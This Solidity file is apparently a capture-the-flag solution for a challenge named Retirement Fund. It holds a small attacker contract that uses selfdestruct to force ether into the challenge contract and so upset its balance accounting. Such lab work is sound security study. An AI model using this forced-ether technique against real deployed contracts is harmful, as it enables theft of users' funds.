//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

import "hardhat/console.sol";

contract RetirementFundAttacker {
    function destroy(address _challenge) external payable {
        selfdestruct(payable(_challenge));
    }
}
